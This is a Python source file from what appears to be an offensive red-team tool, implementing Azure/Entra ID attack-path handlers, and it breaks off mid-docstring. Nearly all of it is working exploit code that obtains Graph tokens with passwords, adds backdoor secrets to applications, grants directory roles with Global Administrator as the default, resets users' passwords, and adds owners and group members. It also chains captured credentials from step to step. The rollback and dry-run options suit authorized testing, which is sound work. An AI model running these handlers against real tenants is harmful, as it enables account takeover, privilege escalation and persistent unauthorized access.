"""Azure / Entra ID edge exploitation handlers.

The Azure plane is token-based (MS Graph) rather than Kerberos/NTLM, so these
handlers use the roadtx/Graph wrapper instead of the AD auth helpers on
``BaseEdgeHandler``.  Authentication is ROPC (username/password) against the
configured tenant — see the ``azure`` config section.

First edge: ``AZAddSecret``.  Subsequent edges (AZMGGrantRole, AZAddOwner,
AZResetPassword, AZAddMembers, AZPrivilegedRoleAdmin) build on the same pattern.
"""

from __future__ import annotations

from pathstrike.engine.command_emitter import emitting
from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import Credential, CredentialType, EdgeInfo, RollbackAction
from pathstrike.tools import roadtx_wrapper as roadtx


class AzureBaseHandler(BaseEdgeHandler):
    """Shared helpers for Entra/Graph handlers.

    Adds token acquisition on top of ``BaseEdgeHandler``.  Concrete handlers
    still implement ``check_prerequisites`` / ``exploit`` / ``get_rollback_action``.
    """

    def _azure_cfg(self):
        """Return the ``azure`` config section, or ``None`` if unconfigured."""
        return getattr(self.config, "azure", None)

    async def _graph_token(self) -> str | None:
        """Acquire an MS Graph token for the configured source principal (ROPC).

        In emit/``learn`` mode the command is still recorded with placeholders
        when no ``azure`` config is present, so the playbook is complete.
        """
        az = self._azure_cfg()
        if az is None:
            if emitting():
                return await roadtx.get_graph_token(
                    auth_mode="ropc",
                    username="<USER>",
                    password="<PASSWORD>",
                    tenant="<TENANT>",
                )
            return None
        password = az.password or ("<PASSWORD>" if emitting() else None)
        return await roadtx.get_graph_token(
            auth_mode=getattr(az, "auth_mode", "ropc"),
            username=az.username,
            password=password,
            tenant=az.tenant_domain,
            client_id=az.client_id,
            roadtx_bin=az.roadtx_path,
        )

    def _source_upn(self, edge: EdgeInfo) -> str | None:
        """UPN of the edge's source principal (falls back to the config user)."""
        az = self._azure_cfg()
        name = edge.source.name if edge and edge.source else None
        if name:
            return name if "@" in name else (f"{name}@{az.tenant_domain}" if az else name)
        return f"{az.username}@{az.tenant_domain}" if az else None

    async def _user_token(self, edge: EdgeInfo) -> str | None:
        """Delegated MS Graph token for the edge's **source user** (ROPC).

        Password resolution order: ``-p source_password=``, then the config
        credential when the source matches ``azure.username``, then a captured
        password in the cred store (campaign chaining / vault). Placeholder
        while emitting.
        """
        az = self._azure_cfg()
        if az is None:
            if emitting():
                return await roadtx.get_graph_token(
                    auth_mode="ropc", username="<USER>", password="<PASSWORD>",
                    tenant="<TENANT>",
                )
            return None

        user = (self._source_upn(edge) or az.username).split("@")[0]
        pw = edge.properties.get("source_password")
        mode = "ropc"
        if pw is None and user.lower() == az.username.split("@")[0].lower():
            pw, mode = az.password, az.auth_mode
        if pw is None:
            cred = self.cred_store.get_best_credential(user, az.tenant_domain)
            if cred and cred.cred_type == CredentialType.password:
                pw = cred.value
        if pw is None and emitting():
            pw = "<PASSWORD>"
        if pw is None:
            return None
        return await roadtx.get_graph_token(
            auth_mode=mode, username=user, password=pw, tenant=az.tenant_domain,
            client_id=az.client_id, roadtx_bin=az.roadtx_path,
        )

    async def _grant_role(
        self, token: str, role_def_id: str, principal_id: str
    ) -> tuple[bool, str, str | None]:
        """POST a directory role assignment; returns (ok, message, assignmentId)."""
        res = await roadtx.graph_request(
            "POST", "/roleManagement/directory/roleAssignments", token,
            body={
                "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
                "roleDefinitionId": role_def_id,
                "principalId": principal_id,
                "directoryScopeId": "/",
            },
        )
        if not res.get("success"):
            return False, f"Role assignment failed: {res.get('error', 'unknown')}", None
        aid = (res.get("parsed") or {}).get("id")
        return True, f"Granted role {role_def_id} to {principal_id} (assignment {aid})", aid

    @staticmethod
    def _app_identifier(edge: EdgeInfo) -> str | None:
        """Best-effort appId/client-id for the target App/SP.

        Checks, in order: an explicit ``-p appid=`` edge property (handy when
        the bare node name is ambiguous between an AZApp and its AZServicePrincipal),
        then the resolved BH node's properties, then the node objectid (BH's
        AZApp objectid equals the appId).
        """
        node = edge.target
        return (
            edge.properties.get("appid")
            or edge.properties.get("appId")
            or node.properties.get("appid")
            or node.properties.get("appId")
            or (node.object_id or None)
        )


@register_handler("AZAddSecret")
class AZAddSecretHandler(AzureBaseHandler):
    """AZAddSecret: add a credential to the target App/SP and authenticate as it.

    Graph flow:
      1. Resolve the application *object id* from its appId.
      2. ``POST /applications/{objectId}/addPassword`` → returns ``secretText``.

    Rollback: ``POST /applications/{objectId}/removePassword`` with the keyId.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label not in ("AZApp", "AZServicePrincipal"):
            return (
                False,
                f"AZAddSecret needs an AZApp/AZServicePrincipal target, "
                f"got {edge.target.label}",
            )
        az = self._azure_cfg()
        if az is None or not az.username or not az.password:
            return False, "No Azure ROPC credential configured (config.azure)"
        if not self._app_identifier(edge):
            return False, f"Could not determine appId for {edge.target.name}"
        return True, f"{edge.source.name} can add a secret to {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        appid = self._app_identifier(edge)
        if not appid and emitting():
            appid = "<APP_ID>"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would add a password credential to {edge.target.name} "
                f"(appId {appid}) via MS Graph addPassword",
                [],
            )

        token = await self._graph_token()
        if not token:
            return False, "Failed to obtain MS Graph token (ROPC) via roadtx", []

        # 1. appId -> application object id (BH AZApp objectid is the appId).
        lookup = await roadtx.graph_request(
            "GET", f"/applications?$filter=appId eq '{appid}'", token
        )
        values = (lookup.get("parsed") or {}).get("value") or []
        app_obj_id = values[0].get("id") if values else None
        if not app_obj_id:
            if emitting():
                app_obj_id = "<APP_OBJECT_ID>"
            else:
                return False, f"Could not resolve application object id for appId {appid}", []

        # 2. addPassword
        res = await roadtx.graph_request(
            "POST",
            f"/applications/{app_obj_id}/addPassword",
            token,
            body={"passwordCredential": {"displayName": "pathstrike"}},
        )
        if not res.get("success"):
            return False, f"addPassword failed: {res.get('error', 'unknown')}", []

        parsed = res.get("parsed") or {}
        secret = parsed.get("secretText")
        key_id = parsed.get("keyId")
        # Stash for rollback (see get_rollback_action).
        self._last_app_obj_id = app_obj_id
        self._last_key_id = key_id

        cred = Credential(
            cred_type=CredentialType.azure_secret,
            value=secret or "<SECRET>",
            username=appid,
            domain=az.tenant_domain if az else "<TENANT>",
            obtained_from=f"AZAddSecret on {edge.target.name}",
        )
        return (
            True,
            f"Added secret to {edge.target.name} (appId {appid}, keyId {key_id})",
            [cred],
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        app_obj_id = getattr(self, "_last_app_obj_id", None)
        key_id = getattr(self, "_last_key_id", None)
        if not app_obj_id or not key_id:
            return None
        url = f"{roadtx.GRAPH_BASE}/applications/{app_obj_id}/removePassword"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_secret",
            description=f"Remove added secret (keyId {key_id}) from {edge.target.name}",
            command=f"roadtx graphrequest -m POST -d '{{\"keyId\":\"{key_id}\"}}' {url}",
            reversible=True,
        )


@register_handler("AZMGGrantRole")
class AZMGGrantRoleHandler(AzureBaseHandler):
    """AZMGGrantRole: a service principal holding RoleManagement.ReadWrite.Directory
    assigns a directory role (e.g. Global Administrator) to a principal we control.

    Auth is **client-credentials** as the source SP (appId + a secret captured by
    a preceding AZAddSecret step, or passed via ``-p``).  Graph:
    ``POST /roleManagement/directory/roleAssignments``.
    Rollback: ``DELETE /roleManagement/directory/roleAssignments/{id}``.
    """

    def _sp_creds(self, edge: EdgeInfo) -> tuple[str | None, str | None]:
        """Resolve (appId, secret) for the source SP.

        Order: explicit ``-p source_appid=``/``-p secret=`` props, then a
        captured ``azure_secret`` credential (from a prior AZAddSecret step),
        then BH node props.
        """
        appid = edge.properties.get("source_appid") or edge.source.properties.get("appid")
        secret = edge.properties.get("secret")
        if not secret:
            for c in self.cred_store.all_credentials():
                if c.cred_type == CredentialType.azure_secret and (
                    not appid or c.username == appid
                ):
                    secret, appid = c.value, (appid or c.username)
                    break
        if emitting():
            appid, secret = (appid or "<SP_APP_ID>"), (secret or "<SP_SECRET>")
        return appid, secret

    @staticmethod
    def _role_definition_id(edge: EdgeInfo) -> str | None:
        """roleDefinitionId for the target role (BH AZRole objectid = ``<templateId>@<tenantId>``)."""
        rid = edge.properties.get("role_definition_id") or edge.target.properties.get(
            "templateid"
        )
        if not rid and edge.target.object_id:
            rid = edge.target.object_id.split("@")[0]
        if not rid and emitting():
            rid = "<ROLE_TEMPLATE_ID>"
        return rid

    @staticmethod
    def _promote_principal(edge: EdgeInfo) -> str | None:
        """Object id of the principal to receive the role (``-p promote=<objectId>``)."""
        p = edge.properties.get("promote")
        if not p and emitting():
            p = "<PRINCIPAL_OBJECT_ID>"
        return p

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label != "AZRole":
            return False, f"AZMGGrantRole needs an AZRole target, got {edge.target.label}"
        appid, secret = self._sp_creds(edge)
        if not appid or not secret:
            return False, (
                "No SP appId/secret — run AZAddSecret on the SP's app first, or pass "
                "-p source_appid=<appId> -p secret=<value>"
            )
        if not self._promote_principal(edge):
            return False, "No principal to promote — pass -p promote=<objectId>"
        if not self._role_definition_id(edge):
            return False, f"Could not determine role definition id for {edge.target.name}"
        return True, (
            f"SP {edge.source.name} can grant {edge.target.name} to "
            f"{self._promote_principal(edge)}"
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        appid, secret = self._sp_creds(edge)
        role_def_id = self._role_definition_id(edge)
        principal_id = self._promote_principal(edge)

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would grant role {role_def_id} to {principal_id} "
                f"as SP {appid}",
                [],
            )

        tenant = az.tenant_id if az else "<TENANT>"
        token = await roadtx.get_sp_token(
            appid, secret, tenant, roadtx_bin=(az.roadtx_path if az else "roadtx")
        )
        if not token:
            return False, "Failed to obtain SP client-credentials token via roadtx", []

        res = await roadtx.graph_request(
            "POST",
            "/roleManagement/directory/roleAssignments",
            token,
            body={
                "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
                "roleDefinitionId": role_def_id,
                "principalId": principal_id,
                "directoryScopeId": "/",
            },
        )
        if not res.get("success"):
            return False, f"Role assignment failed: {res.get('error', 'unknown')}", []

        assignment_id = (res.get("parsed") or {}).get("id")
        self._last_assignment_id = assignment_id
        return (
            True,
            f"Granted {edge.target.name} (roleDefId {role_def_id}) to principal "
            f"{principal_id} (assignment {assignment_id})",
            [],
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        aid = getattr(self, "_last_assignment_id", None)
        if not aid:
            return None
        url = f"{roadtx.GRAPH_BASE}/roleManagement/directory/roleAssignments/{aid}"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_role_assignment",
            description=f"Remove role assignment {aid} ({edge.target.name})",
            command=f"roadtx graphrequest -m DELETE {url}",
            reversible=True,
        )


@register_handler("AZResetPassword")
class AZResetPasswordHandler(AzureBaseHandler):
    """AZResetPassword: a password-reset-capable principal (Helpdesk / Password /
    Authentication / User Administrator) resets a target user's password.

    Graph: ``PATCH /users/{id}`` with a new passwordProfile. Irreversible
    (original password unknown) so no rollback.
    """

    @staticmethod
    def _new_password() -> str:
        import secrets
        import string

        body = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(20))
        return body + "Aa1!"

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label != "AZUser":
            return False, f"AZResetPassword needs an AZUser target, got {edge.target.label}"
        if not (edge.properties.get("target_id") or edge.target.object_id):
            return False, f"No object id for target user {edge.target.name}"
        return True, f"{edge.source.name} can reset {edge.target.name}'s password"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        tgt = edge.properties.get("target_id") or edge.target.object_id or None
        if not tgt and emitting():
            tgt = "<TARGET_OBJECT_ID>"
        new_pw = "<NEW_PASSWORD>" if emitting() else self._new_password()

        if dry_run:
            return True, f"[DRY RUN] Would reset password of {edge.target.name}", []

        token = await self._user_token(edge)
        if not token:
            return False, f"Failed to obtain Graph token for {edge.source.name}", []

        res = await roadtx.graph_request(
            "PATCH", f"/users/{tgt}", token,
            body={"passwordProfile": {"forceChangePasswordNextSignIn": False, "password": new_pw}},
        )
        if not res.get("success"):
            return False, f"Password reset failed: {res.get('error', 'unknown')}", []

        cred = Credential(
            cred_type=CredentialType.password,
            value=new_pw,
            username=edge.target.name.split("@")[0],
            domain=az.tenant_domain if az else "<TENANT>",
            obtained_from=f"AZResetPassword on {edge.target.name}",
        )
        return True, f"Reset password of {edge.target.name}", [cred]

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        return None  # irreversible — the original password is unknown


@register_handler("AZAddMembers", "AZAddMember")
class AZAddMembersHandler(AzureBaseHandler):
    """AZAddMembers: a principal that can manage a group adds a member to it.

    Graph: ``POST /groups/{id}/members/$ref``. Rollback removes the member.
    Principal to add via ``-p add_principal=<objectId>``.
    """

    @staticmethod
    def _principal(edge: EdgeInfo) -> str | None:
        p = edge.properties.get("add_principal")
        if not p and emitting():
            p = "<PRINCIPAL_OBJECT_ID>"
        return p

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label != "AZGroup":
            return False, f"AZAddMembers needs an AZGroup target, got {edge.target.label}"
        if not (edge.properties.get("group_id") or edge.target.object_id):
            return False, f"No object id for group {edge.target.name}"
        if not self._principal(edge):
            return False, "No principal to add — pass -p add_principal=<objectId>"
        return True, f"{edge.source.name} can add members to {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        gid = edge.properties.get("group_id") or edge.target.object_id or None
        if not gid and emitting():
            gid = "<GROUP_OBJECT_ID>"
        pid = self._principal(edge)

        if dry_run:
            return True, f"[DRY RUN] Would add {pid} to group {edge.target.name}", []

        token = await self._user_token(edge)
        if not token:
            return False, f"Failed to obtain Graph token for {edge.source.name}", []

        res = await roadtx.graph_request(
            "POST", f"/groups/{gid}/members/$ref", token,
            body={"@odata.id": f"{roadtx.GRAPH_BASE}/directoryObjects/{pid}"},
        )
        if not res.get("success"):
            return False, f"Add member failed: {res.get('error', 'unknown')}", []

        self._last_gid, self._last_pid = gid, pid
        return True, f"Added {pid} to group {edge.target.name}", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        gid = getattr(self, "_last_gid", None)
        pid = getattr(self, "_last_pid", None)
        if not gid or not pid:
            return None
        url = f"{roadtx.GRAPH_BASE}/groups/{gid}/members/{pid}/$ref"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_group_member",
            description=f"Remove {pid} from group {edge.target.name}",
            command=f"roadtx graphrequest -m DELETE {url}",
            reversible=True,
        )


@register_handler("AZPrivilegedRoleAdmin")
class AZPrivilegedRoleAdminHandler(AzureBaseHandler):
    """AZPrivilegedRoleAdmin: a user holding Privileged Role Administrator grants
    a directory role (default Global Administrator) to a controlled principal.

    Same Graph call as AZMGGrantRole but authenticated as the **user** (delegated)
    rather than an SP. Role via ``-p role_definition_id=`` (default GA), principal
    via ``-p promote=<objectId>``.
    """

    GLOBAL_ADMIN = "62e90394-69f5-4237-9190-012177145e10"

    def _role_def(self, edge: EdgeInfo) -> str:
        return edge.properties.get("role_definition_id") or self.GLOBAL_ADMIN

    @staticmethod
    def _promote(edge: EdgeInfo) -> str | None:
        p = edge.properties.get("promote")
        if not p and emitting():
            p = "<PRINCIPAL_OBJECT_ID>"
        return p

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if not self._promote(edge):
            return False, "No principal to promote — pass -p promote=<objectId>"
        return True, (
            f"{edge.source.name} (Privileged Role Admin) can grant role "
            f"{self._role_def(edge)} to {self._promote(edge)}"
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        role = self._role_def(edge)
        pid = self._promote(edge)

        if dry_run:
            return True, f"[DRY RUN] Would grant role {role} to {pid}", []

        token = await self._user_token(edge)
        if not token:
            return False, f"Failed to obtain Graph token for {edge.source.name}", []

        ok, msg, aid = await self._grant_role(token, role, pid)
        if not ok:
            return False, msg, []
        self._last_assignment_id = aid
        return True, msg, []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        aid = getattr(self, "_last_assignment_id", None)
        if not aid:
            return None
        url = f"{roadtx.GRAPH_BASE}/roleManagement/directory/roleAssignments/{aid}"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_role_assignment",
            description=f"Remove role assignment {aid}",
            command=f"roadtx graphrequest -m DELETE {url}",
            reversible=True,
        )


# ---------------------------------------------------------------------------
# Owner manipulation helpers shared by AZAddOwner/AZOwns and AZMGAddOwner
# ---------------------------------------------------------------------------

def _owner_collection_path(edge: EdgeInfo) -> str:
    """Graph resource path for the target's owners collection.

    Returns one of:
      applications/<objId>/owners
      servicePrincipals/<objId>/owners
      groups/<objId>/owners
    falling back to ``<COLLECTION_PATH>`` in emit mode.
    """
    label = (edge.target.label or "").upper()
    obj = edge.target.object_id or edge.properties.get("target_id") or ""
    if not obj and emitting():
        obj = "<TARGET_OBJECT_ID>"
    if "GROUP" in label:
        return f"groups/{obj}/owners"
    if "APP" in label and "SERVICE" not in label:
        return f"applications/{obj}/owners"
    # Default (AZServicePrincipal or unknown)
    return f"servicePrincipals/{obj}/owners"


def _new_owner(edge: EdgeInfo) -> str | None:
    """Object ID of the principal to add as owner (``-p new_owner=<objectId>``)."""
    p = edge.properties.get("new_owner")
    if not p and emitting():
        p = "<NEW_OWNER_OBJECT_ID>"
    return p


@register_handler("AZAddOwner", "AZOwns")
class AZAddOwnerHandler(AzureBaseHandler):
    """AZAddOwner / AZOwns: add a controlled principal as an owner.

    Works for AZApp, AZServicePrincipal, and AZGroup targets.
    Graph: ``POST /{apps|servicePrincipals|groups}/{id}/owners/$ref``
    Rollback: ``DELETE /{...}/{id}/owners/{newOwnerObjectId}/$ref``
    New owner via ``-p new_owner=<objectId>``.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label not in ("AZApp", "AZServicePrincipal", "AZGroup"):
            return (
                False,
                f"AZAddOwner needs AZApp/AZServicePrincipal/AZGroup target, "
                f"got {edge.target.label}",
            )
        if not _new_owner(edge):
            return False, "No owner to add — pass -p new_owner=<objectId>"
        return True, f"{edge.source.name} can add an owner to {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        coll = _owner_collection_path(edge)
        new_owner_id = _new_owner(edge)

        if dry_run:
            return True, f"[DRY RUN] Would add {new_owner_id} as owner of {edge.target.name}", []

        token = await self._user_token(edge)
        if not token:
            return False, f"Failed to obtain Graph token for {edge.source.name}", []

        res = await roadtx.graph_request(
            "POST", f"/{coll}/$ref", token,
            body={"@odata.id": f"{roadtx.GRAPH_BASE}/directoryObjects/{new_owner_id}"},
        )
        if not res.get("success"):
            return False, f"Add owner failed: {res.get('error', 'unknown')}", []

        self._last_coll = coll
        self._last_owner_id = new_owner_id
        return True, f"Added {new_owner_id} as owner of {edge.target.name}", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        coll = getattr(self, "_last_coll", None)
        oid = getattr(self, "_last_owner_id", None)
        if not coll or not oid:
            return None
        url = f"{roadtx.GRAPH_BASE}/{coll}/{oid}/$ref"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_owner",
            description=f"Remove {oid} from owners of {edge.target.name}",
            command=f"roadtx graphrequest -m DELETE {url}",
            reversible=True,
        )


@register_handler("AZMGAddOwner")
class AZMGAddOwnerHandler(AzureBaseHandler):
    """AZMGAddOwner: a service principal with Application.ReadWrite.All or
    Directory.ReadWrite.All adds an owner to any App, SP, or Group.

    Same Graph call as AZAddOwner but authenticated with **client-credentials**
    as the source SP (appId + secret from a prior AZAddSecret step or via ``-p``).
    New owner via ``-p new_owner=<objectId>``.
    """

    def _sp_creds(self, edge: EdgeInfo) -> tuple[str | None, str | None]:
        appid = edge.properties.get("source_appid") or edge.source.properties.get("appid")
        secret = edge.properties.get("secret")
        if not secret:
            for c in self.cred_store.all_credentials():
                if c.cred_type == CredentialType.azure_secret and (
                    not appid or c.username == appid
                ):
                    secret, appid = c.value, (appid or c.username)
                    break
        if emitting():
            appid = appid or "<SP_APP_ID>"
            secret = secret or "<SP_SECRET>"
        return appid, secret

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label not in ("AZApp", "AZServicePrincipal", "AZGroup"):
            return (
                False,
                f"AZMGAddOwner needs AZApp/AZServicePrincipal/AZGroup target, "
                f"got {edge.target.label}",
            )
        appid, secret = self._sp_creds(edge)
        if not appid or not secret:
            return False, (
                "No SP appId/secret — run AZAddSecret on the SP's app first, or pass "
                "-p source_appid=<appId> -p secret=<value>"
            )
        if not _new_owner(edge):
            return False, "No owner to add — pass -p new_owner=<objectId>"
        return True, f"SP {edge.source.name} can add an owner to {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        appid, secret = self._sp_creds(edge)
        coll = _owner_collection_path(edge)
        new_owner_id = _new_owner(edge)

        if dry_run:
            return True, f"[DRY RUN] Would add {new_owner_id} as owner of {edge.target.name}", []

        tenant = az.tenant_id if az else "<TENANT>"
        token = await roadtx.get_sp_token(
            appid, secret, tenant, roadtx_bin=(az.roadtx_path if az else "roadtx")
        )
        if not token:
            return False, "Failed to obtain SP client-credentials token via roadtx", []

        res = await roadtx.graph_request(
            "POST", f"/{coll}/$ref", token,
            body={"@odata.id": f"{roadtx.GRAPH_BASE}/directoryObjects/{new_owner_id}"},
        )
        if not res.get("success"):
            return False, f"Add owner failed: {res.get('error', 'unknown')}", []

        self._last_coll = coll
        self._last_owner_id = new_owner_id
        return True, f"Added {new_owner_id} as owner of {edge.target.name}", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        coll = getattr(self, "_last_coll", None)
        oid = getattr(self, "_last_owner_id", None)
        if not coll or not oid:
            return None
        url = f"{roadtx.GRAPH_BASE}/{coll}/{oid}/$ref"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_owner",
            description=f"Remove {oid} from owners of {edge.target.name}",
            command=f"roadtx graphrequest -m DELETE {url}",
            reversible=True,
        )


@register_handler("AZMGAddSecret")
class AZMGAddSecretHandler(AzureBaseHandler):
    """AZMGAddSecret: a service principal with Application.ReadWrite.All adds a
    password credential to any App or SP.

    Auth is client-credentials as the source SP. Same Graph flow as AZAddSecret
    but without needing delegated user access — the SP has app-level write.
    """

    def _sp_creds(self, edge: EdgeInfo) -> tuple[str | None, str | None]:
        appid = edge.properties.get("source_appid") or edge.source.properties.get("appid")
        secret = edge.properties.get("secret")
        if not secret:
            for c in self.cred_store.all_credentials():
                if c.cred_type == CredentialType.azure_secret and (
                    not appid or c.username == appid
                ):
                    secret, appid = c.value, (appid or c.username)
                    break
        if emitting():
            appid = appid or "<SP_APP_ID>"
            secret = secret or "<SP_SECRET>"
        return appid, secret

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label not in ("AZApp", "AZServicePrincipal"):
            return (
                False,
                f"AZMGAddSecret needs AZApp/AZServicePrincipal target, got {edge.target.label}",
            )
        appid, secret = self._sp_creds(edge)
        if not appid or not secret:
            return False, (
                "No SP appId/secret — run AZAddSecret on the source SP's app first, or pass "
                "-p source_appid=<appId> -p secret=<value>"
            )
        if not self._app_identifier(edge):
            return False, f"Could not determine appId for target {edge.target.name}"
        return True, f"SP {edge.source.name} can add a secret to {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        src_appid, secret = self._sp_creds(edge)
        tgt_appid = self._app_identifier(edge)
        if not tgt_appid and emitting():
            tgt_appid = "<TARGET_APP_ID>"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would add secret to {edge.target.name} (appId {tgt_appid})",
                [],
            )

        tenant = az.tenant_id if az else "<TENANT>"
        token = await roadtx.get_sp_token(
            src_appid, secret, tenant, roadtx_bin=(az.roadtx_path if az else "roadtx")
        )
        if not token:
            return False, "Failed to obtain SP client-credentials token via roadtx", []

        # Resolve application object ID from appId
        lookup = await roadtx.graph_request(
            "GET", f"/applications?$filter=appId eq '{tgt_appid}'", token
        )
        values = (lookup.get("parsed") or {}).get("value") or []
        app_obj_id = values[0].get("id") if values else None
        if not app_obj_id:
            if emitting():
                app_obj_id = "<APP_OBJECT_ID>"
            else:
                return False, f"Could not resolve application object id for appId {tgt_appid}", []

        res = await roadtx.graph_request(
            "POST",
            f"/applications/{app_obj_id}/addPassword",
            token,
            body={"passwordCredential": {"displayName": "pathstrike"}},
        )
        if not res.get("success"):
            return False, f"addPassword failed: {res.get('error', 'unknown')}", []

        parsed = res.get("parsed") or {}
        new_secret = parsed.get("secretText")
        key_id = parsed.get("keyId")
        self._last_app_obj_id = app_obj_id
        self._last_key_id = key_id

        cred = Credential(
            cred_type=CredentialType.azure_secret,
            value=new_secret or "<SECRET>",
            username=tgt_appid,
            domain=az.tenant_domain if az else "<TENANT>",
            obtained_from=f"AZMGAddSecret on {edge.target.name}",
        )
        return (
            True,
            f"Added secret to {edge.target.name} (appId {tgt_appid}, keyId {key_id})",
            [cred],
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        app_obj_id = getattr(self, "_last_app_obj_id", None)
        key_id = getattr(self, "_last_key_id", None)
        if not app_obj_id or not key_id:
            return None
        url = f"{roadtx.GRAPH_BASE}/applications/{app_obj_id}/removePassword"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_secret",
            description=f"Remove added secret (keyId {key_id}) from {edge.target.name}",
            command=f"roadtx graphrequest -m POST -d '{{\"keyId\":\"{key_id}\"}}' {url}",
            reversible=True,
        )


@register_handler("AZMGAddMember")
class AZMGAddMemberHandler(AzureBaseHandler):
    """AZMGAddMember: a service principal with Group.ReadWrite.All or
    Directory.ReadWrite.All adds a member to any group.

    Auth is client-credentials as the source SP. Same Graph call as AZAddMembers
    but the source is an SP with application permissions, not a user.
    Principal to add via ``-p add_principal=<objectId>``.
    """

    def _sp_creds(self, edge: EdgeInfo) -> tuple[str | None, str | None]:
        appid = edge.properties.get("source_appid") or edge.source.properties.get("appid")
        secret = edge.properties.get("secret")
        if not secret:
            for c in self.cred_store.all_credentials():
                if c.cred_type == CredentialType.azure_secret and (
                    not appid or c.username == appid
                ):
                    secret, appid = c.value, (appid or c.username)
                    break
        if emitting():
            appid = appid or "<SP_APP_ID>"
            secret = secret or "<SP_SECRET>"
        return appid, secret

    @staticmethod
    def _principal(edge: EdgeInfo) -> str | None:
        p = edge.properties.get("add_principal")
        if not p and emitting():
            p = "<PRINCIPAL_OBJECT_ID>"
        return p

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label != "AZGroup":
            return False, f"AZMGAddMember needs an AZGroup target, got {edge.target.label}"
        appid, secret = self._sp_creds(edge)
        if not appid or not secret:
            return False, (
                "No SP appId/secret — run AZAddSecret on the SP's app first, or pass "
                "-p source_appid=<appId> -p secret=<value>"
            )
        if not self._principal(edge):
            return False, "No principal to add — pass -p add_principal=<objectId>"
        return True, f"SP {edge.source.name} can add members to {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        src_appid, secret = self._sp_creds(edge)
        gid = edge.properties.get("group_id") or edge.target.object_id or None
        if not gid and emitting():
            gid = "<GROUP_OBJECT_ID>"
        pid = self._principal(edge)

        if dry_run:
            return True, f"[DRY RUN] Would add {pid} to group {edge.target.name}", []

        tenant = az.tenant_id if az else "<TENANT>"
        token = await roadtx.get_sp_token(
            src_appid, secret, tenant, roadtx_bin=(az.roadtx_path if az else "roadtx")
        )
        if not token:
            return False, "Failed to obtain SP client-credentials token via roadtx", []

        res = await roadtx.graph_request(
            "POST", f"/groups/{gid}/members/$ref", token,
            body={"@odata.id": f"{roadtx.GRAPH_BASE}/directoryObjects/{pid}"},
        )
        if not res.get("success"):
            return False, f"Add member failed: {res.get('error', 'unknown')}", []

        self._last_gid, self._last_pid = gid, pid
        return True, f"Added {pid} to group {edge.target.name}", []

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        gid = getattr(self, "_last_gid", None)
        pid = getattr(self, "_last_pid", None)
        if not gid or not pid:
            return None
        url = f"{roadtx.GRAPH_BASE}/groups/{gid}/members/{pid}/$ref"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_group_member",
            description=f"Remove {pid} from group {edge.target.name}",
            command=f"roadtx graphrequest -m DELETE {url}",
            reversible=True,
        )


@register_handler("AZMGGrantAppRoles")
class AZMGGrantAppRolesHandler(AzureBaseHandler):
    """AZMGGrantAppRoles: a service principal with AppRoleAssignment.ReadWrite.All
    grants an app role to a target SP — the most impactful being
    RoleManagement.ReadWrite.Directory (enabling AZMGGrantRole).

    Graph: ``POST /servicePrincipals/{resourceSpId}/appRoleAssignedTo``
    Required props:
      -p grant_to=<spObjectId>       SP receiving the role
      -p resource_sp_id=<objectId>   SP that owns the role (default: Microsoft Graph)
      -p app_role_id=<guid>          appRoleId to grant (default: RoleManagement.ReadWrite.Directory)
